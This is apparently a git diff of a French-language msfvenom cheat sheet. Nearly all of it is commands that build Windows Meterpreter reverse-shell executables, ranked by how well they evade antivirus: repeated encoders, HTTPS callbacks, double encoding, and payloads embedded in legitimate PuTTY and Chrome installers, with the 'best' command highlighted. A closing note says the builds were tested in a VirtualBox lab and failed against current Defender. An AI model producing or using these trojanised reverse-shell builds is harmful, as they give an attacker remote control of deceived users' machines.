@@ -245,6 +245,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ---
 
+```markdown
 ## TABLEAU COMPLET DES COMMANDES MSFVENOM
 
 ### LÉGENDE DES OPTIONS
@@ -253,7 +254,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 |--------|---------------|---------|
 | `-p` | Payload à utiliser | `-p windows/x64/meterpreter_reverse_tcp` |
 | `-f` | Format de sortie | `-f exe`, `-f raw`, `-f python`, `-f csharp` |
-| `-e` | Encodeur à utiliser | `-e x86/shikata_ga_nai` |
+| `-e` | Encodeur à utiliser | `-e x64/xor_dynamic` |
 | `-i` | Nombre d'itérations | `-i 10` (10 passes d'encodage) |
 | `-x` | Template (fichier à infecter) | `-x /root/putty.exe` |
 | `-k` | Garde le comportement du template | `-k` (le template s'exécute normalement) |
@@ -266,11 +267,11 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ---
 
-##  COMMANDES MSFVENOM (Du moins puissant au plus puissant)
+## COMMANDES MSFVENOM (Du moins puissant au plus puissant)
 
 ---
 
-###  PAYLOAD BRUT (Sans encodage - Très détectable)
+### PAYLOAD BRUT (Sans encodage - Très détectable)
 
 ```bash
 # Payload Windows 64-bit brut
@@ -289,31 +290,31 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe
 
 ---
 
-###  AVEC ENCODAGE SHIKATA_GA_NAI (Moyennement détectable)
+### AVEC ENCODAGE SHIKATA_GA_NAI (32-bit uniquement)
 
 ```bash
-# Shikata_ga_nai 1 itération
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 1 -f exe -o /home/kali/Desktop/payload_shikata1.exe
+# Payload 32-bit + Shikata 1 itération
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 1 -f exe -o /home/kali/Desktop/payload_shikata1.exe
 ```
 
 ```bash
-# Shikata_ga_nai 5 itérations
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/payload_shikata5.exe
+# Payload 32-bit + Shikata 5 itérations
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/payload_shikata5.exe
 ```
 
 ```bash
-# Shikata_ga_nai 10 itérations
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/payload_shikata10.exe
+# Payload 32-bit + Shikata 10 itérations
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/payload_shikata10.exe
 ```
 
 ```bash
-# Shikata_ga_nai 20 itérations
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o /home/kali/Desktop/payload_shikata20.exe
+# Payload 32-bit + Shikata 20 itérations
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o /home/kali/Desktop/payload_shikata20.exe
 ```
 
 ---
 
-### : AVEC XOR_DYNAMIC (Moins détectable que shikata)
+### AVEC XOR_DYNAMIC (64-bit - RECOMMANDÉ)
 
 ```bash
 # XOR_Dynamic 1 itération
@@ -337,7 +338,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 
 
 ---
 
-###  AVEC TEMPLATE (Fichier légitime) - MOINS DÉTECTABLE
+### AVEC TEMPLATE (Fichier légitime) - MOINS DÉTECTABLE
 
 ```bash
 # Putty + pas d'encodage
@@ -345,51 +346,64 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 
 ```
 
 ```bash
-# Putty + Shikata 5 itérations
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/putty_shikata5.exe
-```
-
-```bash
-# Putty + XOR_Dynamic 10 itérations
+# Putty + XOR_Dynamic 10 itérations (RECOMMANDÉ)
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_xor10.exe
 ```
 
----
-
-###  TEMPLATE + HTTPS (Trafic chiffré) - TRÈS FURTIF
-
 ```bash
-# Putty + HTTPS (trafic chiffré)
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_https.exe
+# Putty + XOR_Dynamic 20 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/putty_xor20.exe
 ```
 
 ```bash
-# Putty + HTTPS + 20 itérations (ULTIME)
+# Chrome + XOR_Dynamic 10 itérations
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/ChromeSetup.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/chrome_xor10.exe
+```
+
+---
+
+### TEMPLATE + HTTPS (Trafic chiffré) - TRÈS FURTIF
+
+```bash
+# Putty + HTTPS + XOR 10
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_https10.exe
+```
+
+```bash
+# Putty + HTTPS + XOR 20 (LA MEILLEURE COMMANDE)
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/putty_ultimate.exe
 ```
 
+```bash
+# Chrome + HTTPS + XOR 20
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/ChromeSetup.exe -k -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/chrome_ultimate.exe
+```
+
 ---
 
-###  DOUBLE ENCODAGE (Très difficile à détecter)
+### DOUBLE ENCODAGE (64-bit uniquement - x64 + x64)
 
 ```bash
-# Double encodage : XOR_Dynamic + Shikata
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/double_encoded.exe
+# Double XOR_Dynamic (x64 + x64)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/double_xor.exe
 ```
-
-### DOUBLE ENCODAGE + TEMPLATE putty (preque la meilleur commande)
 
 ```bash
-# Double encodage + Template Putty
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_encoded_putty.exe
+# Double XOR_Dynamic + Template Putty
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_xor_putty.exe
 ```
 
-### DOUBLE ENCODAGE + TEMPLATE CHROME + HTTPS (la meilleur commande)
+```bash
+# Double XOR_Dynamic + HTTPS + Template Putty (LA MEILLEURE)
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_xor_https_putty.exe
+```
 
-````bash
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_ultimate.exe
-````
+```bash
+# Double XOR_Dynamic + HTTPS + Template Chrome
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 10 -x /root/ChromeSetup.exe -k -f exe -o /home/kali/Desktop/double_xor_https_chrome.exe
+```
 
+---
 je me suis beaucoup entrainer -__-
 
 #### apres beaucoup de test j ai remarquer que aucun des malwar present ici ne passer la detection des nouveau anti virus ainsi que la derniere mise a jour de windows defender dans windows 11 pour pouvoir tester tous les malwars sur windows 10 de votre virtual box vous devez passer par un dossier partager entre votre kali linux et votre pc .
